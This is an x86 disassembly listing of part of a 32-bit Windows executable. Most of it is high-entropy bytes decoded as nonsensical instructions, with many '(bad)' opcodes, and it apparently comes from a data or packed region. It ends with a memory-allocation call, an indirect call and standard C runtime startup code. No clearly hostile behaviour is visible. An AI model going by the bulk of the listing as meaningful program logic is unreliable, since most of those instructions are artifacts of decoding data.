  4222fe:	mov    eax,ds:0xdf5ab898
  422303:	imul   ebp,DWORD PTR [ebx+esi*8+0x3aa6e4dd],0x6f9e9b95
  42230e:	jns    0x4222bc
  422310:	jl     0x422317
  422312:	std    
  422313:	fild   DWORD PTR [edx+0xd]
  422316:	sti    
  422317:	jbe    0x422365
  422319:	bswap  eax
  42231b:	jmp    0x522b:0xd61e25b2
  422322:	sub    cl,bl
  422324:	retf   0x20a5
  422327:	(bad)  
  422328:	iret   
  422329:	sub    eax,ecx
  42232b:	mov    eax,ds:0x5a4a2520
  422330:	enter  0x328f,0x39
  422334:	push   edi
  422335:	ins    BYTE PTR es:[edi],dx
  422336:	fdivr  DWORD PTR [edi-0x7edcc293]
  42233c:	test   BYTE PTR [ecx+0xf],bh
  42233f:	(bad)  
  422341:	iret   
  422342:	out    dx,eax
  422343:	in     al,dx
  422344:	psrlq  mm5,QWORD PTR [ebp-0x2ad08b79]
  42234b:	jns    0x422365
  42234d:	mov    bl,0x25
  42234f:	mov    cl,0x6d
  422351:	cmp    BYTE PTR [eax-0x64f2efd2],dh
  422357:	adc    DWORD PTR [eax+0x17e9c771],esi
  42235d:	mov    ds:0xe12b9ca7,al
  422362:	add    ebx,DWORD PTR [esi]
  422364:	das    
  422365:	xor    DWORD PTR [ebx+0x20aa5d77],esi
  42236b:	fs stc 
  42236d:	stos   BYTE PTR es:[edi],al
  42236e:	sti    
  42236f:	xor    ecx,DWORD PTR [edi+0x4b891442]
  422375:	pop    esp
  422376:	jle    0x422310
  422378:	add    eax,0xe3061d1c
  42237d:	cmp    dh,ch
  42237f:	or     ebx,DWORD PTR [edi+0x1e5aee70]
  422385:	pop    ecx
  422386:	ret    
  422387:	(bad)  
  422388:	enter  0xccb6,0xa
  42238c:	sub    eax,0x4f16346f
  422391:	int    0x19
  422393:	sahf   
  422394:	dec    edx
  422395:	jne    0x4223a5
  422397:	mov    WORD PTR [ebx],fs
  422399:	and    eax,0x2291e5d1
  42239e:	and    eax,0x7f1ee6ed
  4223a3:	scas   eax,DWORD PTR es:[edi]
  4223a4:	jnp    0x4223b3
  4223a6:	jae    0x4223b9
  4223a8:	test   DWORD PTR [edi],eax
  4223aa:	push   eax
  4223ab:	push   es
  4223ac:	cld    
  4223ad:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223af:	xchg   esi,eax
  4223b0:	lods   eax,DWORD PTR ds:[esi]
  4223b1:	xor    dl,dl
  4223b3:	lods   al,BYTE PTR ds:[esi]
  4223b4:	xchg   esp,eax
  4223b5:	adc    ch,BYTE PTR [ebx-0x13c6faaa]
  4223bb:	adc    esi,DWORD PTR [esi]
  4223bd:	mov    dh,0x11
  4223bf:	imul   ebx,DWORD PTR [eax],0x33
  4223c2:	fst    st(5)
  4223c4:	int    0x4d
  4223c6:	(bad)  
  4223c7:	mov    ds:0xba96685a,eax
  4223cc:	ja     0x422411
  4223ce:	adc    eax,DWORD PTR [ebx+0x779581d5]
  4223d4:	stc    
  4223d5:	lea    esi,[esi]
  4223d7:	cmp    al,0x3c
  4223d9:	dec    ebx
  4223da:	sub    esp,ebx
  4223dc:	dec    ebx
  4223dd:	(bad)  
  4223de:	repz clc 
  4223e0:	or     al,0xcb
  4223e2:	fistp  WORD PTR [ebp+0x30]
  4223e5:	icebp  
  4223e6:	lock cmp ch,ah
  4223e9:	pushf  
  4223ea:	ja     0x4223de
  4223ec:	add    dl,ah
  4223ee:	cld    
  4223ef:	adc    al,0x14
  4223f1:	mov    esp,0x4b421d71
  4223f6:	adc    dl,BYTE PTR [esi]
  4223f8:	mov    eax,0x5f2a0846
  4223fd:	xchg   ebx,eax
  4223fe:	push   0x71
  422400:	idiv   esp
  422402:	leave  
  422403:	sub    eax,DWORD PTR [edi+eiz*1+0x11]
  422407:	into   
  422408:	pop    ecx
  422409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42240a:	gs sahf 
  42240c:	test   ebp,0x6ee208a0
  422412:	stos   BYTE PTR es:[edi],al
  422413:	lods   eax,DWORD PTR ds:[esi]
  422414:	mov    esp,0xbb035270
  422419:	push   edi
  42241a:	js     0x4223c3
  42241c:	mov    ecx,0x2afef59e
  422421:	mov    eax,0xa3aceb05
  422426:	(bad)  
  422427:	mov    dh,BYTE PTR [edx-0xb]
  42242a:	jl     0x42248d
  42242c:	xor    eax,0xb09db99f
  422431:	push   0x4e
  422433:	push   ds
  422434:	dec    esp
  422435:	jb     0x42244b
  422437:	xchg   ebp,eax
  422438:	cdq    
  422439:	loop   0x42248d
  42243b:	mov    ch,BYTE PTR [ebx]
  42243d:	adc    BYTE PTR ds:0x2c71ee5e,0x5e
  422444:	shl    ah,cl
  422446:	adc    BYTE PTR [esp+ecx*4],0xd3
  42244a:	lods   al,BYTE PTR ds:[esi]
  42244b:	mov    ebp,0xa8b44b7a
  422450:	std    
  422451:	imul   eax,edi,0x1fde1008
  422457:	outs   dx,DWORD PTR ds:[esi]
  422458:	lea    ecx,[edx+0x30097780]
  42245e:	add    al,0xac
  422460:	les    edx,FWORD PTR [edx-0x553d46d4]
  422466:	clc    
  422467:	pop    ds
  422468:	loope  0x4224cf
  42246a:	mov    ch,0xa1
  42246c:	daa    
  42246d:	out    dx,eax
  42246e:	sub    eax,0xa535fa33
  422473:	in     al,0x12
  422475:	inc    esp
  422476:	(bad)  
  422477:	dec    ecx
  422478:	mov    ebp,0xb4feb9d3
  42247d:	ins    DWORD PTR es:[edi],dx
  42247e:	fs sti 
  422480:	lahf   
  422481:	and    ecx,DWORD PTR [edx-0x727094e7]
  422487:	lds    ebx,FWORD PTR [edi-0xbf50bd0]
  42248d:	sbb    ch,BYTE PTR [eax+ecx*4-0x9752362]
  422494:	into   
  422495:	(bad)  
  422496:	out    dx,eax
  422497:	shr    ah,0x75
  42249a:	in     eax,dx
  42249b:	mov    bl,BYTE PTR [eax]
  42249d:	and    edi,edi
  42249f:	inc    ecx
  4224a0:	cmp    eax,0x110d7469
  4224a5:	mov    cl,0x29
  4224a7:	shl    BYTE PTR [edi-0x5dbe7aa4],0xb4
  4224ae:	push   ecx
  4224af:	hlt    
  4224b0:	arpl   WORD PTR [ecx+0x8],dx
  4224b3:	(bad)  
  4224b4:	fild   DWORD PTR [edi]
  4224b6:	loopne 0x422523
  4224b8:	sbb    al,0x6b
  4224ba:	test   al,0xeb
  4224bc:	xchg   esi,eax
  4224bd:	mov    ecx,0x1fcc81d7
  4224c2:	sub    al,0x11
  4224c4:	loop   0x4224ef
  4224c6:	pop    ss
  4224c7:	das    
  4224c8:	outs   dx,BYTE PTR ds:[esi]
  4224c9:	(bad)  
  4224cb:	sbb    al,0x5a
  4224cd:	(bad)  
  4224ce:	sahf   
  4224cf:	adc    ebp,edx
  4224d1:	ins    BYTE PTR es:[edi],dx
  4224d2:	mov    ah,0x77
  4224d4:	push   ecx
  4224d5:	retf   0xefb6
  4224d8:	dec    ebp
  4224d9:	lods   al,BYTE PTR ds:[esi]
  4224da:	js     0x422486
  4224dc:	arpl   WORD PTR [ebp+0x54],cx
  4224df:	xor    al,al
  4224e1:	shl    BYTE PTR [eax],0x30
  4224e4:	lods   al,BYTE PTR ds:[esi]
  4224e5:	ins    DWORD PTR es:[edi],dx
  4224e6:	out    0x91,eax
  4224e8:	jle    0x4224cb
  4224ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224eb:	jo     0x422566
  4224ed:	(bad)  
  4224ee:	clc    
  4224ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224f0:	mov    dh,0x0
  4224f2:	mov    ds:0xa26ae877,eax
  4224f7:	and    DWORD PTR [ebx+0x11c33bad],eax
  4224fd:	xlat   BYTE PTR ds:[ebx]
  4224fe:	test   al,0xad
  422500:	and    al,0x73
  422502:	arpl   dx,di
  422504:	imul   DWORD PTR [edx+ebx*2-0x517b8e01]
  42250b:	(bad)  
  42250c:	mov    al,0xea
  42250e:	xchg   BYTE PTR [edi-0x36],al
  422511:	in     eax,0x64
  422513:	push   edx
  422514:	in     al,0xc7
  422516:	mov    bl,0xc6
  422518:	div    al
  42251a:	lahf   
  42251b:	xchg   esp,eax
  42251c:	mov    bl,0x8c
  42251e:	jl     0x42259e
  422520:	in     al,dx
  422521:	rol    DWORD PTR [esi+0x64],1
  422524:	adc    BYTE PTR [ebx],ch
  422526:	inc    ebx
  422527:	stc    
  422528:	mov    eax,ss
  42252a:	rcr    dl,cl
  42252c:	mov    ds:0xf72ad691,eax
  422531:	hlt    
  422532:	rcl    DWORD PTR [ebx-0x3b4d1ced],cl
  422538:	outs   dx,DWORD PTR ds:[esi]
  422539:	cmp    DWORD PTR [esi-0x3f],edi
  42253c:	dec    ebx
  42253d:	loopne 0x422509
  42253f:	adc    DWORD PTR ds:0x9c2af31e,ecx
  422545:	xor    dl,ah
  422547:	xchg   DWORD PTR [eax+0x72cef375],esp
  42254d:	sub    esp,ecx
  42254f:	jo     0x4225ba
  422551:	ror    BYTE PTR [ecx-0x756e395b],0x55
  422558:	sbb    edi,DWORD PTR [ebp-0x56668a7a]
  42255e:	jb     0x4224f6
  422560:	cwde   
  422561:	outs   dx,BYTE PTR ds:[esi]
  422562:	and    al,0x67
  422564:	call   0x1c9e0b31
  422569:	add    ebx,eax
  42256b:	inc    edi
  42256c:	mov    ebx,0x92b988d6
  422571:	rol    eax,0x4f
  422574:	dec    eax
  422575:	pushf  
  422576:	ficom  DWORD PTR [edi-0x6b35f61c]
  42257c:	cmp    BYTE PTR [esi+edi*8-0x989bffa],dh
  422583:	jns    0x422505
  422585:	add    ebp,DWORD PTR [edx]
  422587:	inc    ecx
  422588:	inc    BYTE PTR [edx+esi*4+0x773e427f]
  42258f:	pop    ebx
  422590:	mov    es,WORD PTR [ebp-0x73f8f2]
  422596:	or     al,0x7a
  422598:	sub    BYTE PTR [eax],0xfa
  42259b:	dec    ecx
  42259c:	push   edx
  42259d:	push   ss
  42259e:	mov    al,ds:0x99d619fc
  4225a3:	imul   edx,DWORD PTR [edx-0x20bcca57],0xa99b21e4
  4225ad:	ficom  WORD PTR [edx+ebp*1-0x6148f063]
  4225b4:	pop    ebx
  4225b5:	xor    al,0x40
  4225b7:	jmp    0x4225fe
  4225b9:	mov    ah,0xd6
  4225bb:	mov    edi,0xfccf3f91
  4225c0:	jecxz  0x4225a5
  4225c2:	mov    dl,0x98
  4225c4:	out    0xaf,eax
  4225c6:	sub    bh,BYTE PTR [edi]
  4225c8:	mov    al,ds:0x2a568652
  4225cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225ce:	xor    BYTE PTR [eax+0x48f62022],dl
  4225d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225d5:	neg    DWORD PTR [esp+ecx*1-0x2d]
  4225d9:	or     al,0x24
  4225db:	mov    BYTE PTR [esi],dl
  4225dd:	pop    es
  4225de:	hlt    
  4225df:	aam    0xb6
  4225e1:	mov    DWORD PTR [ecx-0x51a0d67d],ecx
  4225e7:	and    eax,0x8c42cfe
  4225ec:	int    0xe8
  4225ee:	arpl   WORD PTR [eax+0xc],bx
  4225f1:	aad    0xf8
  4225f3:	push   ebp
  4225f4:	repnz out dx,eax
  4225f6:	clc    
  4225f7:	inc    edx
  4225f8:	fisttp WORD PTR [edx-0x5f]
  4225fb:	rcr    DWORD PTR [ebp+0x33],1
  4225fe:	mov    bl,ah
  422600:	and    eax,0x4fd8827c
  422605:	leave  
  422606:	in     eax,0xd9
  422608:	pop    esi
  422609:	pop    edx
  42260a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260b:	cmc    
  42260c:	adc    DWORD PTR [edi+0x3b744026],esp
  422612:	xchg   edi,eax
  422613:	xlat   BYTE PTR ds:[ebx]
  422614:	mov    ecx,0x8b675dc0
  422619:	(bad)  
  42261a:	push   esp
  42261b:	bswap  ebp
  42261d:	dec    ebx
  42261e:	retf   
  42261f:	push   0xe681b6a7
  422624:	test   eax,0x5c5cefbc
  422629:	push   eax
  42262a:	popf   
  42262b:	xor    BYTE PTR [esi+esi*1+0x50],bh
  42262f:	sub    eax,0xab0fd423
  422634:	clc    
  422635:	int    0x7
  422637:	adc    ebp,ecx
  422639:	outs   dx,BYTE PTR ds:[esi]
  42263a:	pop    eax
  42263b:	xchg   edi,eax
  42263c:	push   0x1e7e0635
  422641:	fs adc cl,bl
  422644:	adc    DWORD PTR [ebx-0x79],eax
  422647:	cmp    DWORD PTR [edx+0x1b],ebx
  42264a:	shl    BYTE PTR [esi+0x301f4b43],0xf
  422651:	call   0x81dc3ece
  422656:	xchg   ebp,eax
  422657:	shr    BYTE PTR [edx-0x4d4ab96f],1
  42265d:	push   ebx
  42265e:	dec    esp
  42265f:	ret    0xfac4
  422662:	or     DWORD PTR ds:0xa3257ec5,esi
  422668:	popf   
  422669:	adc    BYTE PTR [esi+0x63551d5c],bh
  42266f:	jae    0x422624
  422671:	or     eax,0x7fa9e5d2
  422676:	mov    ecx,DWORD PTR [eax+edx*1]
  422679:	and    DWORD PTR [edi+0x21],ebp
  42267c:	stos   DWORD PTR es:[edi],eax
  42267d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267e:	or     al,0xdc
  422680:	into   
  422681:	out    dx,al
  422682:	adc    esi,DWORD PTR [ecx]
  422684:	adc    eax,0xb9f32248
  422689:	les    ebx,FWORD PTR [esp+ebp*4+0x518b766a]
  422690:	loop   0x422631
  422692:	sbb    esi,0xffffffd7
  422695:	ins    BYTE PTR es:[edi],dx
  422696:	mov    cl,0xa8
  422698:	shl    DWORD PTR [eax-0x53ad8e2b],0x3b
  42269f:	sbb    eax,ecx
  4226a1:	cmp    eax,0x1249f4f5
  4226a6:	jmp    0x793:0x43b35805
  4226ad:	dec    dx
  4226af:	and    eax,0x3e514e2
  4226b4:	xchg   DWORD PTR [ebx],ecx
  4226b6:	xlat   BYTE PTR ds:[ebx]
  4226b7:	xchg   BYTE PTR [ebp+ebx*4+0x73ac5dc0],ah
  4226be:	and    DWORD PTR [esi+0x34],0x13d0a3a2
  4226c5:	js     0x422717
  4226c7:	scas   eax,DWORD PTR es:[edi]
  4226c8:	bound  esp,QWORD PTR ds:[edx-0x7248ade8]
  4226cf:	fidiv  WORD PTR [edi-0x7862145f]
  4226d5:	outs   dx,BYTE PTR ds:[esi]
  4226d6:	pop    edx
  4226d7:	cmp    al,0x19
  4226d9:	cmp    eax,0x809a6167
  4226de:	xor    BYTE PTR [ebx+0x6d],0x72
  4226e2:	fisubr WORD PTR [ebp+0xec28901]
  4226e8:	sbb    al,0xb4
  4226ea:	out    dx,al
  4226eb:	(bad)  
  4226ec:	icebp  
  4226ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ee:	je     0x422743
  4226f0:	xor    DWORD PTR [edi+0x11],esi
  4226f3:	pop    es
  4226f4:	(bad)  
  4226f6:	adc    DWORD PTR [edi+0x71301202],0x77
  4226fd:	mov    ds:0x1b53b229,al
  422702:	pop    eax
  422703:	pop    es
  422704:	cdq    
  422705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422706:	xchg   edx,eax
  422707:	and    dl,BYTE PTR [esi+0x39c32cb0]
  42270d:	std    
  42270e:	cmc    
  42270f:	ja     0x422758
  422711:	sahf   
  422712:	pop    eax
  422713:	add    ebx,DWORD PTR [esi+0xf74f593]
  422719:	inc    ecx
  42271a:	dec    eax
  42271b:	test   BYTE PTR [ebx+eiz*2+0x31107f6d],al
  422722:	push   0xfffffffd
  422724:	dec    BYTE PTR [edi-0x4ac7d0aa]
  42272a:	adc    eax,0x8fa925ae
  42272f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422730:	fwait
  422731:	jl     0x42276d
  422733:	and    BYTE PTR [esi],0x3a
  422736:	js     0x4226fe
  422738:	fdiv   DWORD PTR [edx]
  42273a:	push   ss
  42273b:	or     DWORD PTR [edx],esi
  42273d:	scas   al,BYTE PTR es:[edi]
  42273e:	sar    bh,cl
  422740:	test   al,0x5c
  422742:	adc    DWORD PTR [esi+0x7c],edi
  422745:	out    dx,eax
  422746:	fstp   QWORD PTR [edi+0x64]
  422749:	jecxz  0x4227aa
  42274b:	jb     0x4226cf
  42274d:	inc    eax
  42274e:	imul   edx,DWORD PTR [ecx+ecx*2-0x3c2185b0],0x70af8060
  422759:	pop    edx
  42275a:	out    0x22,al
  42275c:	dec    ebx
  42275d:	mov    ds:0x88b8dd4c,eax
  422762:	aam    0x1a
  422764:	(bad)  
  422765:	and    ebx,0x8a0fd7e5
  42276b:	and    eax,0x30f37bbc
  422770:	cmp    ebp,edx
  422772:	cmp    al,0xdf
  422774:	or     esp,esi
  422776:	out    0x55,al
  422778:	add    ebx,edx
  42277a:	aad    0xe
  42277c:	mov    ebx,0x1511963b
  422781:	xor    BYTE PTR [ebx],dl
  422783:	repz push ds
  422785:	dec    ebx
  422786:	mov    cl,0xd5
  422788:	lods   al,BYTE PTR ds:[esi]
  422789:	mov    eax,ds:0x206e0f3a
  42278e:	add    edi,DWORD PTR [esi]
  422790:	out    0x9e,al
  422792:	out    0x86,al
  422794:	sbb    BYTE PTR [ebx-0x5dd2eaf5],dh
  42279a:	lods   eax,DWORD PTR ds:[esi]
  42279b:	jbe    0x4227f5
  42279d:	lea    ebx,[edx-0x33e72c7a]
  4227a3:	lahf   
  4227a4:	mov    bh,0x5f
  4227a6:	sahf   
  4227a7:	ret    
  4227a8:	and    ebp,esi
  4227aa:	mov    BYTE PTR [ecx+0x1bd497b8],dl
  4227b0:	jb     0x422788
  4227b2:	retf   
  4227b3:	std    
  4227b4:	xchg   edi,eax
  4227b5:	jge    0x4227b3
  4227b7:	adc    eax,0x287404e5
  4227bc:	cdq    
  4227bd:	loopne 0x42280f
  4227bf:	leave  
  4227c0:	sti    
  4227c1:	mov    eax,0x30366369
  4227c6:	imul   DWORD PTR [edx-0x65]
  4227c9:	mul    DWORD PTR [ecx]
  4227cb:	inc    edi
  4227cc:	sbb    al,0x6d
  4227ce:	cmp    DWORD PTR [ebx],0xffffff9f
  4227d1:	inc    esi
  4227d2:	jnp    0x422788
  4227d4:	dec    ebx
  4227d5:	sbb    esp,esp
  4227d7:	adc    BYTE PTR [edi],0x4d
  4227da:	das    
  4227db:	dec    esp
  4227dc:	scas   eax,DWORD PTR es:[edi]
  4227dd:	aaa    
  4227de:	xchg   BYTE PTR [esi+edi*4-0x5e4d15a8],al
  4227e5:	ret    0x163e
  4227e8:	and    al,0xb4
  4227ea:	mov    bh,BYTE PTR [eax-0x18]
  4227ed:	nop
  4227ee:	pop    esp
  4227ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227f0:	lock pop es
  4227f2:	dec    ebx
  4227f3:	xor    ebx,ebx
  4227f5:	xor    esi,esp
  4227f7:	aas    
  4227f8:	mov    al,ds:0x36c1b443
  4227fd:	dec    ebx
  4227fe:	loopne 0x4227f7
  422800:	aad    0xca
  422802:	mov    edx,eax
  422804:	or     al,0x4f
  422806:	mov    dh,0x3
  422808:	xor    eax,0x8b72132d
  42280d:	xchg   edx,eax
  42280e:	xchg   edi,eax
  42280f:	cmp    ecx,DWORD PTR [ebp-0x36]
  422812:	fstp   DWORD PTR [eax+0x7218ddfb]
  422818:	ds aad 0xdd
  42281b:	xor    dh,dl
  42281d:	cld    
  42281e:	inc    edx
  42281f:	sub    al,0x72
  422821:	or     DWORD PTR [eax+0x53a73454],ecx
  422827:	mov    dh,bl
  422829:	push   0x583ea0d1
  42282e:	cs jae 0x4227b5
  422831:	fnsave [edi+0x2f]
  422834:	pop    esp
  422835:	(bad)  
  422836:	cld    
  422837:	leave  
  422838:	jecxz  0x4227d9
  42283a:	dec    esi
  42283b:	jmp    0xab11380a
  422840:	js     0x42284c
  422842:	mov    al,0xd8
  422844:	(bad)  
  422845:	xor    bh,dh
  422847:	fwait
  422848:	adc    cl,BYTE PTR [eax]
  42284a:	sbb    eax,0x39a95d75
  42284f:	push   ebp
  422850:	imul   eax,DWORD PTR [esi+edi*1-0x11202078],0x2ea29f37
  42285b:	bound  ecx,QWORD PTR [edi]
  42285d:	mov    edi,0xa3dd6ef0
  422862:	xor    DWORD PTR [ecx-0x5d],edx
  422865:	pop    ebx
  422866:	mov    ds,WORD PTR [esi-0x69]
  422869:	pop    edi
  42286a:	repnz rcr DWORD PTR [esi-0x10],0x4d
  42286f:	cmp    esp,DWORD PTR [edi+0x76]
  422872:	and    bh,ch
  422874:	dec    ebx
  422875:	ss addr16 aam 0x95
  422879:	cs lock jle 0x4228b4
  42287d:	test   BYTE PTR [edi],dh
  42287f:	iret   
  422880:	cwde   
  422881:	out    dx,eax
  422882:	les    ebp,FWORD PTR [ebx-0x2a]
  422885:	dec    esi
  422886:	sbb    al,0x24
  422888:	add    BYTE PTR [edx],al
  42288a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42288b:	xchg   ebx,eax
  42288c:	jge    0x42282d
  42288e:	add    ecx,0x9c8a83cf
  422894:	inc    ecx
  422895:	fidiv  DWORD PTR [edx+0x6]
  422898:	cs push ebp
  42289a:	retf   0x7e6a
  42289d:	dec    eax
  42289e:	push   ebx
  42289f:	cmp    DWORD PTR [edx],eax
  4228a1:	nop
  4228a2:	psubusb mm3,mm3
  4228a5:	test   al,0x42
  4228a7:	clc    
  4228a8:	int3   
  4228a9:	(bad)
  4228ac:	dec    eax
  4228ad:	out    0x1e,al
  4228af:	aad    0xf9
  4228b1:	mov    ebx,DWORD PTR [esi-0x326c1fef]
  4228b7:	or     DWORD PTR [eax-0xd],ebx
  4228ba:	in     eax,0x74
  4228bc:	sar    BYTE PTR [ecx],1
  4228be:	jle    0x4228ab
  4228c0:	les    ebx,FWORD PTR [edi-0x33]
  4228c3:	neg    BYTE PTR [edx]
  4228c5:	aad    0x11
  4228c7:	cli    
  4228c8:	jecxz  0x422935
  4228ca:	in     al,dx
  4228cb:	aaa    
  4228cc:	inc    ecx
  4228cd:	jl     0x4228f3
  4228cf:	inc    esi
  4228d0:	pusha  
  4228d1:	clc    
  4228d2:	nop
  4228d3:	lea    ebp,[edx+ecx*2-0x656f1362]
  4228da:	mov    ah,0xc8
  4228dc:	mov    bh,0x7a
  4228de:	sbb    BYTE PTR [eax+edi*8+0x2e218bf4],bh
  4228e5:	cmp    al,0xc2
  4228e7:	adc    eax,0xa6b994f0
  4228ec:	xlat   BYTE PTR ds:[ebx]
  4228ed:	popf   
  4228ee:	mov    ch,0xf4
  4228f0:	cmp    eax,0xb22449a4
  4228f5:	aaa    
  4228f6:	pop    ss
  4228f7:	cmp    dl,BYTE PTR [eax]
  4228f9:	out    dx,al
  4228fa:	jne    0x42295d
  4228fc:	or     dl,bh
  4228fe:	jnp    0x4228b7
  422900:	test   eax,0xa8ddc89b
  422905:	mov    ch,0x38
  422907:	daa    
  422908:	addr16 jp 0x42293f
  42290b:	lahf   
  42290c:	mov    ah,0xa8
  42290e:	std    
  42290f:	pop    ecx
  422910:	int    0x3
  422912:	aaa    
  422913:	cmp    eax,0x5093a6c1
  422918:	hlt    
  422919:	ss (bad) 
  42291b:	mov    esp,0x385d8209
  422920:	dec    ebp
  422921:	jns    0x42292b
  422923:	ror    BYTE PTR [edx-0x49790825],cl
  422929:	mov    al,0x6
  42292b:	into   
  42292c:	mov    ebp,0xded109a3
  422931:	add    esp,DWORD PTR [ebp-0x31]
  422934:	rcr    DWORD PTR [ebx],cl
  422936:	mov    ds:0x7b89c547,al
  42293b:	fstp   QWORD PTR [eax+0x65]
  42293e:	and    edx,DWORD PTR [edx+0x2a10391a]
  422944:	cld    
  422945:	adc    dh,ah
  422947:	fs mov al,0x4b
  42294a:	outs   dx,DWORD PTR ds:[esi]
  42294b:	mov    dl,0x2c
  42294d:	xchg   ebx,eax
  42294e:	rcl    bl,cl
  422950:	cmp    eax,0xf6f0dd68
  422955:	adc    cl,BYTE PTR [eax]
  422957:	sti    
  422958:	mov    eax,0xb3576c7d
  42295d:	scas   al,BYTE PTR es:[edi]
  42295e:	arpl   WORD PTR [ebp+0x71f73297],bx
  422964:	arpl   WORD PTR [ebx],dx
  422966:	ja     0x4229a8
  422968:	in     eax,dx
  422969:	sbb    DWORD PTR ds:0x6cc948f1,ebp
  42296f:	call   0x72b:0x48be3f64
  422976:	inc    esp
  422977:	dec    ebp
  422978:	rcr    DWORD PTR [ebp+0x391a11e4],1
  42297e:	leave  
  42297f:	push   edx
  422980:	daa    
  422981:	xor    edi,DWORD PTR [eax+0x5caa564f]
  422987:	ins    DWORD PTR es:[edi],dx
  422988:	mov    ecx,0xbdb9653
  42298d:	or     BYTE PTR [ebx],0xe8
  422990:	imul   ebp,DWORD PTR [esi+edx*1],0xc896303a
  422997:	adc    dl,0xfe
  42299a:	xchg   esi,eax
  42299b:	js     0x422988
  42299d:	mov    ds:0x5147efee,eax
  4229a2:	ins    DWORD PTR es:[edi],dx
  4229a3:	xchg   esi,eax
  4229a4:	push   esp
  4229a5:	sub    DWORD PTR ds:[ebx-0x1e],esp
  4229a9:	adc    BYTE PTR [eax],al
  4229ab:	jo     0x422991
  4229ad:	test   al,0xe1
  4229af:	dec    ecx
  4229b0:	clc    
  4229b1:	mov    edx,DWORD PTR [ecx]
  4229b3:	enter  0xddba,0xe6
  4229b7:	push   esp
  4229b8:	jae    0x4229a7
  4229ba:	jbe    0x422a2c
  4229bc:	xchg   ebp,eax
  4229bd:	sbb    esi,DWORD PTR [ebp+0xc]
  4229c0:	ret    
  4229c1:	adc    cl,BYTE PTR [ebx+0x20af79a3]
  4229c7:	and    eax,0xf903da36
  4229cc:	hlt    
  4229cd:	push   ecx
  4229ce:	pop    ebp
  4229cf:	xchg   edi,eax
  4229d0:	in     al,dx
  4229d1:	ret    
  4229d2:	lea    ebp,[ebx+0x306a103a]
  4229d8:	push   0x4
  4229da:	push   0x1000
  4229df:	push   0x4cf
  4229e4:	push   0x1000
  4229e9:	call   DWORD PTR ds:0x42802c
  4229ef:	push   0x0
  4229f1:	call   esi
  4229f3:	xor    eax,eax
  4229f5:	pop    esi
  4229f6:	add    esp,0x10
  4229f9:	ret    0x10
  4229fc:	nop
  4229fd:	nop
  4229fe:	nop
  4229ff:	nop
  422a00:	jmp    DWORD PTR ds:0x428110
  422a06:	cmp    DWORD PTR ds:0x45fb9c,0x1
  422a0d:	jne    0x422a14
  422a0f:	call   0x422f52
  422a14:	push   DWORD PTR [esp+0x4]
  422a18:	call   0x422ddb
  422a1d:	push   0xff
  422a22:	call   DWORD PTR ds:0x45f294
  422a28:	pop    ecx
  422a29:	pop    ecx
  422a2a:	ret    
  422a2b:	cmp    DWORD PTR ds:0x45fb9c,0x1
  422a32:	jne    0x422a39
  422a34:	call   0x422f52
  422a39:	push   DWORD PTR [esp+0x4]
  422a3d:	call   0x422ddb
  422a42:	push   0xff
  422a47:	call   0x422c21
  422a4c:	pop    ecx
  422a4d:	pop    ecx
  422a4e:	ret    
  422a4f:	push   0x60
  422a51:	push   0x428150
  422a56:	call   0x423940
  422a5b:	mov    edi,0x94
  422a60:	mov    eax,edi
  422a62:	call   0x423990
  422a67:	mov    DWORD PTR [ebp-0x18],esp
  422a6a:	mov    esi,esp
  422a6c:	mov    DWORD PTR [esi],edi
  422a6e:	push   esi
  422a6f:	call   DWORD PTR ds:0x42805c
  422a75:	mov    ecx,DWORD PTR [esi+0x10]
  422a78:	mov    DWORD PTR ds:0x45fba4,ecx
  422a7e:	mov    eax,DWORD PTR [esi+0x4]
  422a81:	mov    ds:0x45fbb0,eax
  422a86:	mov    edx,DWORD PTR [esi+0x8]
  422a89:	mov    DWORD PTR ds:0x45fbb4,edx
  422a8f:	mov    esi,DWORD PTR [esi+0xc]
  422a92:	and    esi,0x7fff
  422a98:	mov    DWORD PTR ds:0x45fba8,esi
  422a9e:	cmp    ecx,0x2
  422aa1:	je     0x422aaf
  422aa3:	or     esi,0x8000
  422aa9:	mov    DWORD PTR ds:0x45fba8,esi
  422aaf:	shl    eax,0x8
  422ab2:	add    eax,edx
  422ab4:	mov    ds:0x45fbac,eax
  422ab9:	xor    esi,esi
  422abb:	push   esi
  422abc:	mov    edi,DWORD PTR ds:0x428014
  422ac2:	call   edi
  422ac4:	cmp    WORD PTR [eax],0x5a4d
  422ac9:	jne    0x422aea
  422acb:	mov    ecx,DWORD PTR [eax+0x3c]
  422ace:	add    ecx,eax
  422ad0:	cmp    DWORD PTR [ecx],0x4550
  422ad6:	jne    0x422aea
  422ad8:	movzx  eax,WORD PTR [ecx+0x18]
  422adc:	cmp    eax,0x10b
  422ae1:	je     0x422b02
  422ae3:	cmp    eax,0x20b
  422ae8:	je     0x422aef
  422aea:	mov    DWORD PTR [ebp-0x1c],esi
  422aed:	jmp    0x422b16
  422aef:	cmp    DWORD PTR [ecx+0x84],0xe
  422af6:	jbe    0x422aea
  422af8:	xor    eax,eax
  422afa:	cmp    DWORD PTR [ecx+0xf8],esi
  422b00:	jmp    0x422b10
  422b02:	cmp    DWORD PTR [ecx+0x74],0xe
  422b06:	jbe    0x422aea
  422b08:	xor    eax,eax
  422b0a:	cmp    DWORD PTR [ecx+0xe8],esi
  422b10:	setne  al
  422b13:	mov    DWORD PTR [ebp-0x1c],eax
  422b16:	push   0x1
  422b18:	call   0x4238ed
  422b1d:	pop    ecx
  422b1e:	test   eax,eax
  422b20:	jne    0x422b2a
  422b22:	push   0x1c
  422b24:	call   0x422a2b
  422b29:	pop    ecx
  422b2a:	call   0x423864
  422b2f:	test   eax,eax
  422b31:	jne    0x422b3b
  422b33:	push   0x10
  422b35:	call   0x422a2b
  422b3a:	pop    ecx
  422b3b:	call   0x42374d
  422b40:	mov    DWORD PTR [ebp-0x4],esi
